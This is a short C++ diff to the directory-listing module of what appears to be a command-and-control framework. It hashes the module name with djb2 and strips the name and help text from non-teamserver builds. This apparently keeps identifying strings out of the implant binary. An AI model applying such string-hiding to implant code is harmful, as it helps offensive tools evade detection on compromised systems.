@@ -5,10 +5,14 @@
 #include <filesystem>
 #include <sstream>
 
+#include "Common.hpp"
+
+
 using namespace std;
 
 
-const std::string moduleName = "tree";
+constexpr std::string_view moduleName = "tree";
+constexpr unsigned long moduleHash = djb2(moduleName);
 
 
 #ifdef _WIN32
@@ -21,7 +25,11 @@ __declspec(dllexport) Tree* TreeConstructor()
 #endif
 
 Tree::Tree()
-	: ModuleCmd(moduleName)
+#ifdef BUILD_TEAMSERVER
+	: ModuleCmd(std::string(moduleName), moduleHash)
+#else
+	: ModuleCmd("", moduleHash)
+#endif
 {
 }
 
@@ -32,11 +40,12 @@ Tree::~Tree()
 std::string Tree::getInfo()
 {
 	std::string info;
+#ifdef BUILD_TEAMSERVER
 	info += "tree:\n";
 	info += "Tree\n";
 	info += "exemple:\n";
 	info += "- tree /tmp\n";
-
+#endif
 	return info;
 }
 
@@ -61,7 +70,7 @@ int Tree::process(C2Message &c2Message, C2Message &c2RetMessage)
 	string path = c2Message.cmd();
 	std::string outCmd = iterProcess(path, 0);
 
-	c2RetMessage.set_instruction(m_name);
+	c2RetMessage.set_instruction(c2RetMessage.instruction());
 	c2RetMessage.set_cmd(path);
 	c2RetMessage.set_returnvalue(outCmd);
 
